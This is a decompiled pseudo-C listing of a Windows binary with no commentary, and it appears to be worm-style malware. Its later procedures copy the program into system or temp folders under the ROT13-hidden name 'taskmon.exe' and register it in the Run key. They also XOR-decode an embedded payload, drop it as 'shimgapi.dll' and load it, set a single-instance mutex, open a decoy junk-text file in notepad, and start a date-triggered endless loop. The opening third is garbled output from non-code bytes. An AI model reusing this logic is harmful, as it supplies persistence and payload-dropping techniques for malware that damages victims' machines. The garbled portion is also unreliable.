        004a26de: asm("cmpsb");
        004a26df: *(ebp + 73) & ah;
        004a26e2: *edx = *edx ^ bl;
        004a26e4: (restore)es;
        004a26e5: asm("imul edx");
        004a26e7: asm("loopne 0x4a26c2");
        004a26e9: asm("aad 0xd4");
        004a26eb: asm("salc");
        004a26ec: asm("fninit");
        004a26ee: asm("out dx,al");
        004a26ef: asm("cld");
        004a26f0: eax = eax | 1867659297;
        004a26f5: asm("Unknown opcode 0x8f");
        004a26f6: dl = 216;
        004a26f8: *LFBC38E5C = *LFBC38E5C + ebp;
    }
004a26fc: L004a26fc:
    004a26fe: asm("%s jz 0x4a26b6");
    004a2701: asm("stc");
    004a2702: eax = eax + 1;
    004a2703: dl = bh;
    004a2705: asm("daa");
    004a2706: asm("jpe 0x4a26d8");
    004a270e: if(*(ebp + 329991908) = *(ebp + 329991908) - eax) {
        ff10007f: goto L004a26fc;
    }
    004a2710: (restore)ebp;
    004a2711: asm("ror dword [eax-0x3e],1");
    004a2714: asm("aas");
    004a2715: edi = -581842878;
    004a271a: asm("fucom st0");
    004a271c: asm("out 0xef,al");
    004a271e: asm("sti");
    004a271f: bl = bl | *(ecx + esi);
    004a2723: asm("Unknown opcode 0x64");
    004a2724: asm("Unknown opcode 0x82");
    004a2725: *L4518EEC7 = eax;
    004a272a: if(ecx = ecx - 1) {
        ff100081: goto L004a26d4;
    }
    004a272c: asm("ficom word [edi]");
    004a272e: (save)ebx;
    004a272f: asm("xchg eax,edx");
    004a2730: asm("aam 0x19");
    004a2732: asm("popa");
    004a2733: al = *esi;
    004a2733: esi = esi + 1;
    004a2734: asm("cli");
    004a2735: ebx = ebx - 1;
    004a2736: asm("lahf");
    004a2737: *(eax - 83) = !( *(eax - 83));
    004a273f: asm("sbb cl,[ecx+eax+0xf372f479]");
    004a2746: while(eax = eax | -1421879696) {
    }
    004a2748: *L67CE38A5 = dl;
    004a274e: esp = esp + *(edx + 1016195396);
    004a2754: goto L00003d7d;
    004a275b: dh = dh + al;
    004a275d: asm("Unknown opcode 0x8f");
    004a275e: (restore)ebx;
    004a275f: bh = bh - ah;
    004a2761: *(ecx + 658727556) = *(ecx + 658727556) >> 1;
    004a2767: (save)cs;
004a2768: L004a2768:
    004a2768: asm("clc");
    004a2769: asm("in eax,0xd5");
    004a276b: asm("enter 0xb7be,0xb3");
    004a276f: dl = 180;
    004a2771: ecx = -337982271;
    004a2776: *esi();
    004a2778: *(ebp + 109) = *(ebp + 109) ^ cl;
    004a277c: dh = 223;
    004a277e: edi = edi | *L000000DF;
    004a2780: asm("insb");
    004a2781: eax = *L935214D9;
    004a2786: asm("xlatb");
    004a2787: (save)ds;
    004a278d: es = -1369963083;
    004a278e: asm("arpl dx,ax");
    004a2790: al = al & 137;
    004a2792: asm("int1");
    004a2793: (restore)esp;
    004a2794: asm("retf 0xaf3b");
    004a2797: al = *%es:0xa6209d1d];
    004a279d: asm("das");
004a279e: L004a279e:
    004a279e: ebx = -842744133;
    004a27a3: (fsave)1;
    004a27a5: asm("cli");
    004a27a6: asm("Unknown opcode 0x0f");
    004a27a7: asm("daa");
    004a27a8: edx = edx + 1;
    004a27a9: asm("pusha");
004a27b0: L004a27b0:
    004a27b4: if(*(ebp + 1394865868) = *(ebp + 1394865868) & 838188166) {
        ff100085: goto L004a2768;
    }
    004a27b6: *edi = *edi / *edi;
    004a27b6: edx = *edi % *edi;
    004a27b8: bl = al;
    004a27ba: *(ebp - 44) = *(ebp - 44) - edi;
    004a27bd: asm("%c mov ebp,ebx");
    004a27c0: esi = esi - 1;
    004a27c1: ah = 29;
    004a27c3: eax = edi;
    004a27c5: (save)-33;
    004a27c7: (save)edi;
    004a27c8: asm("rcl byte [eax-0x2f],cl");
    004a27cb: (save)ebp;
    004a27cc: (fsave)((frestore)) - *(esi - 13);
    004a27cf: asm("adc dword [esi],-0x54");
    004a27d2: ebp = ebp + 1;
    004a27d3: asm("loope 0x4a2755");
    004a27d7: asm("outsd");
    004a27d8: asm("sbb cl,al");
    004a27da: if(!(al = al & bh)) {
        004a27dc: asm("in al,0x9e");
        004a27de: (restore)ebx;
        004a27df: asm("sbb ebx,esi");
        004a27e1: ah = 109;
        004a27e9: if(*LB187B047 == ebp) {
            ff100089: goto L004a27b0;
        }
        004a27eb: *edi = *edi ^ ebx;
        004a27ed: asm("loop 0x4a282b");
        004a27ef: asm("xchg esi,[edi+0xca4a0a9]");
        004a27f5: asm("cmpsd");
        004a27f6: esp = esp + 1;
        004a27f7: *edi = al;
        004a27f7: edi = edi + 1;
        004a27f8: ebp = ebp - 1;
        004a27f9: asm("Unknown opcode 0x8d");
        004a27fa: asm("enter 0xedeb,0x38");
        004a2803: asm("fbld tword [edx+0x7c]");
004a2806: L004a2806:
        004a2806: return;
        004a2807: asm("adc dword [eax],0xe9827306");
    }
    004a280d: if(eax = eax + -526230659) {
        ff10008b: goto L004a279e;
    }
    004a280f: asm("aam 0xf");
    004a2811: ebx = 892171876;
    004a2816: *LEB9FE9F8 = al;
    004a281b: edx = 1138902534;
    004a2820: asm("fdivr qword [ebp+edi+0xcaa4dba1]");
004a2823: L004a2823:
    004a2827: asm("xchg eax,ebx");
    004a2828: dh = dh ^ bh;
    004a282a: ebp = ebp + 1;
    004a282b: asm("aad 0xcb");
    004a282d: asm("sbb [0x7593e566],dl");
    004a2833: dh :: dh;
    004a2835: (restore)ebp;
    004a2836: ebp = ebp - 1;
    004a2837: goto L0000520c;
    004a283e: *edi = al;
    004a283e: edi = edi + 1;
    004a283f: eax :: 1396607088;
    004a2844: asm("cwde");
    004a2845: (save)ss;
    004a2846: asm("Unknown opcode 0xc5");
    004a2847: asm("rol dword [0x45872fec],0x8a");
    004a284e: *edi = eax;
    004a284e: edi = edi + 4;
    004a284f: asm("xchg eax,ebp");
    004a2850: eax = -2115267456;
    004a2855: asm("into");
    004a2856: asm("clc");
    004a2857: asm("sbb cl,al");
    004a2859: asm("xchg bl,[%gs:esi+0x6c0dc3db]");
    004a2860: cl = cl >> 173;
    004a2865: asm("xchg ecx,[ebx+0xd0da5977]");
    004a286b: cl = 16;
    004a286d: if(al = al + *edi) {
        ff10008d: goto L004a2806;
    }
    004a286f: return;
    004a2870: >= ? 0x4a2868 : ;
    004a2872: asm("sbb [ebp+0x4e7fb87c],ebx");
    004a2878: >= ? L004a28cd : ;
    004a287a: (save)72;
004a287b: L004a287b:
    004a287c: (save)ebp;
    004a287d: ch = 150;
    004a287f: asm("cmpsd");
    004a2880: ebx = 688516306;
    004a2886: if(esp = esp - 1) {
        ff10008f: goto L004a2823;
    }
    004a2888: asm("Unknown opcode 0xc7");
    004a2889: asm("imul byte [eax]");
    004a288b: (restore)ebp;
    004a288c: asm("xchg eax,ebp");
    004a288d: asm("ror byte [esi],1");
    004a2890: asm("xchg eax,ebx");
    004a2891: (fsave)((frestore)) - *(ecx + esi * 2);
    004a2894: asm("rcl dword [edx+ebp*2],0xc3");
    004a2898: (restore)ds;
    004a2899: if(edi = edi - 1) {
        ff100091: goto L004a287b;
    }
    004a289c: asm("lodsd");
    004a289d: asm("sbb [esi+0x5ce26bf7],al");
    004a28a3: *(ecx - 36) = ((frestore));
    004a28a6: asm("Unknown opcode 0x62");
    004a28a7: goto L004a2920;
    004a28a9: if(!(ebp = ebp + 1)) {
        004a28ab: *(ecx + -877222763) = *(ecx + -877222763) | 227;
        004a28b2: asm("Unknown opcode 0xfe");
        004a28b3: asm("sbb al,0x3d");
        004a28b5: asm("popa");
        004a28b6: *(edx + 2017595359) = dh;
        004a28bc: cl = 237;
        004a28be: al = al - 110;
        004a28c0: bl = 251;
        004a28c2: esi = esi + 1;
        004a28c3: asm("xchg eax,esp");
        004a28c4: asm("in eax,0x39");
        004a28c7: goto L000045d9;
        004a28ce: ah = 38;
        004a28d0: asm("wait");
        004a28d1: asm("adc ecx,[esi+0x98118d0c]");
        004a28d7: ch = ch & *(edi + 23646783);
        004a28dd: asm("popf");
        004a28de: al :: 222;
        004a28e0: *ebx = *ebx - -42;
        004a28e3: *L175AA0E9 & dh;
        004a28e9: asm("xlatb");
        004a28ea: eax = L00006b96();
        004a28f1: ebx = ebx + 1;
        004a28f2: (save)ds;
        004a28f3: asm("cld");
        004a28f4: asm("ffree st1");
        004a28f8: if(al & 146) {
            ff100095: goto L004a2969;
        }
        004a28fa: asm("bound ebx,[eax+0x51]");
        004a28fd: ebp = ebp - 1;
        004a28fe: esp = esp - 1;
        004a28ff: esi = esi - 1;
        004a2901: ebx = ebx;
        004a2902: asm("o16 jz 0x4a288a");
        004a2905: asm("cdq");
        004a2906: al = 202;
        004a2908: asm("out 0x7,eax");
        004a290a: dl = dl - *(eax + 121);
        004a290d: *edi = *esi;
        004a290d: edi = edi + 4;
        004a290d: esi = esi + 4;
        004a290e: asm("aam 0x6");
        004a2910: esi :: *(ebx - 82);
        004a2913: asm("in al,dx");
        004a2914: eax = eax - 1325578353;
        004a2919: asm("lahf");
004a291a: L004a291a:
        004a291a: asm("repne dec eax");
        004a291c: eax = *L23BE5CFD;
004a2920: L004a2920:
        004a2923: asm("%f aad 0x49");
    }
    004a2926: *edx = *edx >> 183;
    004a2929: asm("aaa");
    004a292a: edx = 1431685440;
    004a292f: (restore)eax;
    004a2930: (restore)esi;
    004a2931: asm("a16 jnc 0x4a28b6");
    004a2934: asm("xchg eax,esp");
    004a2935: eax & 469425345;
    004a293a: asm("aas");
    004a293b: asm("o16 nop");
    004a293d: ebp = -1890180883;
004a2942: L004a2942:
    004a2942: asm("retf");
    004a2943: cl = cl | *(ecx + edx * 4 - 39);
    004a2949: return(al & 114);
    004a294a: (restore)ss;
    004a294b: asm("outsb");
    004a294c: asm("enter 0x8525,0xe8");
    004a2950: esi = esi - 1;
    004a2951: bh = 35;
    004a2953: asm("xchg eax,edx");
    004a2956: asm("int1");
    004a2957: asm("insb");
    004a2958: goto L00001d8d;
    004a295f: al = 70;
    004a2961: *(ebx + 26) = ((frestore));
    004a2964: esp = 1655966049;
004a2969: L004a2969:
    004a2969: asm("adc eax,edi");
    004a296b: if(!(al = al + 121)) {
        004a296d: asm("cmc");
        004a296e: ch = 120;
004a2970: L004a2970:
        004a2970: asm("%d pop es");
        004a2972: *(edx + -64927372) = *(edx + -64927372) << cl;
        004a2978: asm("fidivr dword [ebx+0x5d70869f]");
        004a297e: ebp = ebp - 1;
        004a297f: eax = eax + 1;
        004a2980: asm("%s das");
        004a2982: ebp = ebp - *edx;
        004a2984: al = al - 49;
        004a298a: if(*(edx + edx * 2 + 99) > eax) {
            ff100099: goto L004a291a;
        }
        004a298c: al & 197;
        004a298e: asm("in eax,0x8");
        004a2990: asm("%c push edi");
        004a2992: *(edx + -1940842012) = *(edx + -1940842012) ^ -54;
        004a299c: asm("loopne 0x4a29cb");
        004a299e: if(ecx = ecx | *(edi - 106)) {
            ff10009b: goto L004a2970;
        }
        004a29a0: asm("%e jg 0x4a297e");
    }
    004a29aa: asm("daa");
    004a29ab: asm("sahf");
    004a29ac: asm("sbb [ebp+0xa71e9815],dl");
    004a29b2: esi = esi ^ *ebx;
    004a29b4: asm("%s cmp al,0x45");
    004a29b7: (save)ecx;
    004a29b8: asm("pusha");
    004a29b9: if(bl < *(ecx + eax + -1287465879)) {
        ff10009d: goto L004a2942;
    }
    004a29bb: asm("lahf");
    004a29bc: edx = 1142815192;
    004a29c1: asm("outsb");
    004a29c2: asm("wait");
    004a29c3: asm("retf");
}

/*	Procedure: 0x004A29C4 - 0x004A29DB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A29C4()
{



    004a29c4: asm("Unknown opcode 0xfe");
    004a29c5: al = al ^ 109;
    004a29c7: eax & -1217451288;
    004a29cc: dl = dl + *(eax - 95);
    004a29cf: asm("cmc");
    004a29d0: esp = esp - 1;
    004a29d1: asm("cmpsb");
    004a29d2: esp = esp + *(ebx - 58);
    004a29d7: *(al - 149 - 30) = *(al - 149 - 30) + esi;
    004a29da: (save)edi;
    004a29db: asm("iret");
}

/*	Procedure: 0x004A29DC - 0x004A29DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A29DC()
{



    004a29dc: edx = edx - 1;
    004a29dd: asm("enter 0xcd49,0xcd");
}

/* DEST BLOCK NOT FOUND: 004a3831 -> 004a3899 */
/*	Procedure: 0x004A381A - 0x004A384E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A381A()
{



    004a381a: bl = 83;
    004a381c: asm("cmpsb");
    004a381d: *L360524B4 = eax;
    004a3822: *(edx + -841546093) = *(edx + -841546093) >> 1;
    004a3828: *(edi - 34) = *(edi - 34) - edx;
    004a382b: (save)esp;
    004a382c: edi = 774101351;
    004a3831: asm("jpe 0x4a3899");
    004a3833: bl = 184;
    004a3835: edx = edx - 1;
    004a3836: asm("popa");
    004a3837: asm("les eax,[edx]");
    004a3839: asm("sbb ebp,[eax+0x5d]");
    004a383c: asm("xchg eax,esp");
    004a383d: ebp = ebp - *(edi + 42);
    004a3840: asm("aaa");
    004a3841: esi = -1902005237;
    004a3846: al = al | 195;
    004a3848: asm("sbb ebx,edi");
    004a384a: eax = eax + 49253722;
}

/*	Procedure: 0x004A3EB0 - 0x004A3F31
 *	Argument size: 12
 *	Local size: 1032
 *	Save regs size: 4
 */

L004A3EB0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffbf8;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vffffffff;



    004a3eba: ecx = 0;
    004a3ebc: esi = 0;
    004a3ec1: (save)edi;
    004a3ec2: Vffffffff = 199;
    004a3ec6: if(Ac > 0) {
        004a3ec8: edi = __imp__WriteFile;
        004a3ece: (save)ebx;
        004a3ecf: do {
            004a3ed5: if(ecx >= 1024) {
                004a3eda: (save)0;
                004a3edc: (save) & Vfffffff8;
                004a3ee3: (save)ecx;
                004a3ee4: (save) & Vfffffbf8;
                004a3ee5: (save)A10;
                004a3ee8: *edi();
                004a3eea: ecx = 0;
            }
            004a3eef: ebx = 133;
            004a3ef7: al = *(esi + A8) ^ Vffffffff;
            004a3efa: ecx = ecx + 1;
            004a3efb: *(ebp + ecx + -1033) = al;
            004a3f02: eax = esi;
            004a3f04: asm("cdq");
            004a3f07: al = ebx / ebx % ebx / ebx;
            004a3f09: dl = 3;
            004a3f0b: asm("imul dl");
            004a3f0d: Vffffffff = Vffffffff + al;
            004a3f10: esi = esi + 1;
        } while(esi < Ac);
        004a3f18: (restore)ebx;
        004a3f19: if(ecx != 0) {
            004a3f2c: eax = *edi(A10, & Vfffffbf8, ecx, & Vfffffff8, 0);
        }
    }
    004a3f2e: (restore)edi;
}

/*	Procedure: 0x004A3F32 - 0x004A4075
 *	Argument size: 4
 *	Local size: 300
 *	Save regs size: 12
 */

L004A3F32(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffed4;
	/* unknown */ void  Vffffffec;



    004a3f41: (save)"fuvztncv.qyy";
    004a3f47: L004A471C( & Vffffffec);
    004a3f4c: esi = A8;
    004a3f4f: ebx = __imp__lstrcatA;
    004a3f56: edi = 0;
    004a3f58: (restore)ecx;
    004a3f59: *(esi + 268) = 0;
    004a3f5f: A8 = 0;
    004a3f62: do {
        004a3f65: if(A8 != edi) {
            004a3f81: (save) & Vfffffed4;
            004a3f82: (save)280;
            004a3f87: eax = *__imp__GetTempPathA();
        } else {
            004a3f6d: (save)280;
            004a3f72: (save) & Vfffffed4;
            004a3f73: eax = *__imp__GetSystemDirectoryA();
        }
        004a3f94: if(Vfffffed4 != 0) {
            004a3f9c: (save) & Vfffffed4;
            004a3fab: if(*(ebp + *__imp__lstrlenA() + -301) != 92) {
                004a3fb3: (save)0x4a2a28;
                004a3fb8: (save) & Vfffffed4;
                004a3fb9: *ebx();
            }
            004a3fbe: (save) & Vffffffec;
            004a3fc5: (save) & Vfffffed4;
            004a3fc6: *ebx();
            004a3fc8: (save)edi;
            004a3fc9: (save)128;
            004a3fce: (save)2;
            004a3fd0: (save)edi;
            004a3fd1: (save)3;
            004a3fd9: (save)1073741824;
            004a3fde: (save) & Vfffffed4;
            004a3fe5: edi = *__imp__CreateFileA();
            004a3fe9: if(edi != 0 && edi != -1) {
                ff1000af: goto L004a4013;
            }
            004a3ff6: (save) & Vfffffed4;
            004a3ff7: eax = *__imp__GetFileAttributesA();
            004a4000: if(eax != -1) {
                ff1000b1: goto L004a4039;
            }
            004a4002: edi = 0;
        }
        004a4004: A8 = A8 + 1;
    } while(A8 < 2);
    004a4011: goto L004a4054;
004a4013: L004a4013:
    004a401e: L004A3EB0(0x4a13e0, 5632, edi);
    004a4026: (save)edi;
    004a4027: *__imp__CloseHandle();
    004a402d: *(esi + 268) = 1;
    004a4037: goto L004a4043;
004a4039: L004a4039:
    004a4039: *(esi + 268) = 2;
004a4043: L004a4043:
    004a4049: (save) & Vfffffed4;
    004a404d: (save)esi + 8;
    004a404e: eax = *__imp__lstrcpyA();
004a4054: L004a4054:
    004a405b: if(*(esi + 268) == 1) {
        004a4061: eax = *__imp__LoadLibraryA(esi + 8);
        004a4067: *(esi + 268) = 2;
    }
}

/*	Procedure: 0x004A4076 - 0x004A4128
 *	Argument size: 7
 *	Local size: 136
 *	Save regs size: 12
 */

L004A4076(A8, Ab)
/* unknown */ void  A8;
/* unknown */ void  Ab;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffff78;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a4088: (save)"Fbsgjner\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Rkcybere\PbzQyt32\Irefvba";
    004a408e: L004A471C( & Vffffff78);
    004a4097: ebx = 0;
    004a4099: (restore)ecx;
    004a409a: *A8 = 0;
    004a409c: Ab = 0;
    004a409f: esi = -2147483646;
    004a40a4: do {
        004a40a7: (save) & Vfffffffc;
        004a40a8: (save)131097;
        004a40ad: eax = & Vffffff78;
        004a40b3: (save)ebx;
        004a40b4: (save)eax;
        004a40b8: al = ~Ab;
        004a40ba: asm("sbb eax,eax");
        004a40be: (save)eax + esi;
        004a40c7: if(*__imp__RegOpenKeyExA() == 0) {
            ff1000b7: goto L004a411e;
        }
        004a40c9: Ab = Ab + 1;
    } while(Ab < 2);
    004a40d2: *A8 = 1;
    004a40d8: Ab = bl;
    004a40db: do {
        004a40de: (save) & Vfffffff8;
        004a40e2: (save) & Vfffffffc;
        004a40e3: (save)ebx;
        004a40e4: (save)131078;
        004a40e9: (save)ebx;
        004a40ea: (save)ebx;
        004a40eb: eax = & Vffffff78;
        004a40f1: (save)ebx;
        004a40f2: (save)eax;
        004a40f6: al = ~Ab;
        004a40f8: asm("sbb eax,eax");
        004a40fc: (save)eax + esi;
        004a40fd: eax = *__imp__RegCreateKeyExA();
        004a4105: if(eax == 0) {
            004a410a: eax = *__imp__RegCloseKey(Vfffffffc);
        }
        004a4110: Ab = Ab + 1;
    } while(Ab < 2);
004a4119: L004a4119:
    004a411d: return;
004a411e: L004a411e:
    004a411e: (save)Vfffffffc;
    004a4121: eax = *__imp__RegCloseKey();
    004a4127: goto L004a4119;
}

/*	Procedure: 0x004A4129 - 0x004A415E
 *	Argument size: -64
 *	Local size: 64
 *	Save regs size: 0
 */

L004A4129()
{
	/* unknown */ void  Vffffffc0;



    004a4132: (save)"FjroFvcpFzgkF0";
    004a4138: L004A471C( & Vffffffc0);
    004a4141: (restore)ecx;
    004a4142: (save) & Vffffffc0;
    004a4143: (save)1;
    004a4145: (save)0;
    004a4147: *__imp__CreateMutexA();
    004a4158: eax = ~( *__imp__GetLastError() - 183);
    004a415a: asm("sbb eax,eax");
    004a415e: return(eax + 1);
}

/*	Procedure: 0x004A415F - 0x004A42B0
 *	Argument size: 4
 *	Local size: 564
 *	Save regs size: 12
 */

L004A415F(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffdcc;
	/* unknown */ void  Vfffffed0;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vfffffffc;



    004a416e: (save)"gnfxzba.rkr";
    004a4174: L004A471C( & Vffffffe8);
    004a4180: (restore)ecx;
    004a4181: ebx = 0;
    004a4183: (save)260;
    004a4188: (save) & Vfffffdcc;
    004a4189: (save)0;
    004a418a: *__imp__GetModuleFileNameA();
    004a4193: edi = __imp__lstrcpyA;
    004a419f: eax = A8 + 272;
    004a41a4: (save) & Vfffffdcc;
    004a41a5: (save)eax;
    004a41a6: Vfffffffc = eax;
    004a41a9: *__imp__lstrcpyA();
    004a41ab: esi = __imp__lstrcatA;
    004a41b1: A8 = ebx;
    004a41b4: do {
        004a41b7: if(A8 != ebx) {
            004a41d3: (save) & Vfffffed0;
            004a41d4: (save)280;
            004a41d9: eax = *__imp__GetTempPathA();
        } else {
            004a41bf: (save)280;
            004a41c4: (save) & Vfffffed0;
            004a41c5: eax = *__imp__GetSystemDirectoryA();
        }
        004a41e5: if(Vfffffed0 != bl) {
            004a41f1: (save) & Vfffffed0;
            004a4200: if(*(ebp + *__imp__lstrlenA() + -305) != 92) {
                004a4208: (save)0x4a2a28;
                004a420d: (save) & Vfffffed0;
                004a420e: *esi();
            }
            004a4213: (save) & Vffffffe8;
            004a421a: (save) & Vfffffed0;
            004a421b: *esi();
            004a4223: (save)32;
            004a4225: (save) & Vfffffed0;
            004a4226: *__imp__SetFileAttributesA();
            004a422c: (save)ebx;
            004a422d: (save)128;
            004a4232: (save)2;
            004a4234: (save)ebx;
            004a4235: (save)3;
            004a423d: (save)1073741824;
            004a4242: (save) & Vfffffed0;
            004a4243: eax = *__imp__CreateFileA();
            004a424b: if(eax == ebx || eax == -1) {
                004a4285: (save) & Vfffffed0;
                004a4286: eax = *__imp__GetFileAttributesA();
            } else {
                004a4252: (save)eax;
                004a4253: *__imp__CloseHandle();
                004a425f: (save) & Vfffffed0;
                004a4260: *__imp__DeleteFileA();
                004a426c: (save)ebx;
                004a426d: (save) & Vfffffed0;
                004a4274: (save) & Vfffffdcc;
                004a4275: eax = *__imp__CopyFileA();
                004a427b: eax :: 0;
            }
            004a428f: if(eax != -1) {
                ff1000c9: goto L004a42a0;
            }
        }
        004a4291: A8 = A8 + 1;
    } while(A8 < 2);
    004a429e: goto L004a42ac;
004a42a0: L004a42a0:
    004a42aa: eax = *edi(Vfffffffc, & Vfffffed0);
004a42ac: L004a42ac:
}

/*	Procedure: 0x004A42B1 - 0x004A434B
 *	Argument size: 4
 *	Local size: 164
 *	Save regs size: 8
 */

L004A42B1(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff5c;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vfffffffc;



    004a42c2: (save)"Fbsgjner\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Eha";
    004a42c7: (save) & Vffffff5c;
    004a42c8: L004A471C();
    004a42d0: (save)"GnfxZba";
    004a42d5: (save) & Vffffffdc;
    004a42d6: L004A471C();
    004a42db: esi = __imp__RegOpenKeyExA;
    004a42e1: esp = esp + 16;
    004a42e7: edi = 131078;
    004a42ec: (save) & Vfffffffc;
    004a42ed: (save)131078;
    004a42f4: (save)0;
    004a42f6: (save) & Vffffff5c;
    004a42f7: (save)-2147483646;
    004a4300: if(*__imp__RegOpenKeyExA() != 0) {
        004a4305: (save) & Vfffffffc;
        004a4306: (save)edi;
        004a430d: (save)0;
        004a430f: (save) & Vffffff5c;
        004a4310: (save)-2147483647;
        004a4315: eax = *esi();
        004a4319: if(eax != 0) {
            ff1000cf: goto L004a4348;
        }
    }
    004a431e: esi = A8 + 272;
    004a4324: (save)esi;
    004a4339: *__imp__RegSetValueExA();
    004a4342: eax = *__imp__RegCloseKey(Vfffffffc, Vfffffffc, & Vffffffdc, 0, 1, esi, *__imp__lstrlenA() + 1);
004a4348: L004a4348:
}

/*	Procedure: 0x004A434C - 0x004A438D
 *	Argument size: -12
 *	Local size: 16
 *	Save regs size: 0
 */

L004A434C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a4355: (save) & Vfffffff0;
    004a4356: *__imp__GetSystemTimeAsFileTime();
    004a4369: *__imp__SystemTimeToFileTime(A8 + 548, & Vfffffff8);
    004a4375: if(Vfffffff4 > Vfffffffc) {
        004a437b: return(1);
    }
    004a437c: >= ? L004a4382 : ;
    004a4380: esp = ebp;
    004a4381: return(0);
    004a4382: eax = Vfffffff8;
    004a4385: eax :: Vfffffff0;
    004a4388: asm("sbb eax,eax");
    004a438a: eax = ~eax;
    004a438c: esp = ebp;
}

/*	Procedure: 0x004A438E - 0x004A43D4
 *	Argument size: -12
 *	Local size: 16
 *	Save regs size: 0
 */

L004A438E(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a4397: (save) & Vfffffff8;
    004a4398: *__imp__GetSystemTimeAsFileTime();
    004a43a1: (save) & Vfffffff0;
    004a43aa: (save)A8 + 532;
    004a43ab: *__imp__SystemTimeToFileTime();
    004a43b1: eax = Vfffffffc;
    004a43b7: if(eax >= Vfffffff4) {
        004a43b9: eax = Vfffffff8;
        004a43bf: if(eax >= Vfffffff0) {
            004a43c1: while(1) {
                004a43c1: L004A7355();
                004a43cb: *__imp__Sleep(1024);
            }
        }
    }
}

/*	Procedure: 0x004A43D5 - 0x004A458D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A43D5()
{



    004a43d5: (save)ebp;
    004a43d6: ebp = esp;
    004a43d8: esp = esp - 1124;
    004a43de: eax = ebp + -356;
    004a43e4: (save)ebx;
    004a43e5: ebx = 0;
    004a43e7: (save)eax;
    004a43e8: (save)260;
    004a43ed: *(ebp + -356) = 0;
    004a43f3: *__imp__GetTempPathA();
    004a43ff: if(*(ebp + -356) != bl) {
        004a440b: (save)esi;
        004a440c: (save)ebp + -356;
        004a441b: esi = __imp__lstrcatA;
        004a4421: if(*(ebp + *__imp__lstrlenA() + -357) != 92) {
            004a4429: (save)0x4a2a28;
            004a442e: (save)ebp + -356;
            004a442f: *__imp__lstrcatA();
        }
        004a4437: (save)"Message";
        004a443c: (save)ebp + -356;
        004a443d: *esi();
        004a443f: (save)ebx;
        004a4440: (save)128;
        004a4445: (save)2;
        004a4447: (save)ebx;
        004a4448: (save)3;
        004a4450: (save)-1073741824;
        004a4455: (save)ebp + -356;
        004a4456: eax = *__imp__CreateFileA();
        004a445e: *(ebp - 4) = eax;
        004a4461: if(eax != ebx && eax != -1) {
            004a4470: esi = __imp__WriteFile;
            004a4476: (save)edi;
            004a4477: edi = 0;
            004a4479: *(ebp - 8) = 4096;
            004a4480: do {
                004a4486: if(edi >= 508) {
                    004a448b: (save)ebx;
                    004a448c: (save)ebp - 12;
                    004a4493: (save)512;
                    004a4498: (save)ebp + -868;
                    004a4499: (save) *(ebp - 4);
                    004a449c: *esi();
                    004a449e: edi = 0;
                }
                004a44a0: L004A48BC();
                004a44a5: eax = ax & 65535;
                004a44a8: (save)76;
                004a44aa: asm("cdq");
                004a44ab: (restore)ecx;
                004a44b0: if(ecx / ecx % ecx / ecx != 0) {
                    004a44c5: L004A48BC();
                    004a44ca: eax = ax & 65535;
                    004a44cd: asm("cdq");
                    004a44d8: *(ebp + edi + -868) = 239 / 239 % 239 / 239 + 16;
                } else {
                    004a44b2: *(ebp + edi + -868) = 13;
                    004a44ba: edi = edi + 1;
                    004a44bb: *(ebp + edi + -868) = 10;
                }
                004a44df: edi = edi + 1;
            } while(*(ebp - 8) = *(ebp - 8) - 1);
            004a44e7: if(edi != ebx) {
                004a44ec: (save)ebx;
                004a44ed: (save)ebp - 12;
                004a44f4: (save)edi;
                004a44f5: (save)ebp + -868;
                004a44f6: (save) *(ebp - 4);
                004a44f9: *esi();
            }
            004a44fb: (save) *(ebp - 4);
            004a44fe: esi = __imp__CloseHandle;
            004a4504: *__imp__CloseHandle();
            004a4519: *__imp__wsprintfA();
            004a451f: (save)68;
            004a4521: eax = ebp - 96;
            004a4524: (restore)edi;
            004a4528: memset(eax, ebx, edi, ebp + -1124, "notepad %s", ebp + -356);
            004a4530: ecx = ebp - 28;
            004a4533: *(ebp - 96) = edi;
            004a4536: *(ebp - 48) = 5;
            004a453f: (save)ecx;
            004a4543: (save)ebp - 96;
            004a4544: (save)ebx;
            004a4545: (save)ebx;
            004a4546: (save)ebx;
            004a4547: *(ebp - 52) = 1;
            004a454a: (save)1;
            004a454b: (save)ebx;
            004a4552: (save)ebx;
            004a4553: (save)ebp + -1124;
            004a4554: (save)ebx;
            004a455d: (restore)edi;
            004a455e: if(*__imp__CreateProcessA() != 0) {
                004a4560: (save)-1;
                004a4562: (save) *(ebp - 28);
                004a4565: *__imp__WaitForSingleObject();
                004a456b: (save) *(ebp - 28);
                004a456e: *esi();
            }
        }
        004a4576: (restore)esi;
        004a4577: if(*(ebp + -356) != bl) {
            004a457f: (save)ebp + -356;
            004a4580: *__imp__DeleteFileA();
        }
    }
    004a4586: (save)ebx;
    004a4587: *__imp__ExitThread();
    004a458d: (restore)ebx;
}

/*	Procedure: 0x004A458E - 0x004A462D
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A458E(A8)
/* unknown */ void  A8;
{



    004a4591: (save)ecx;
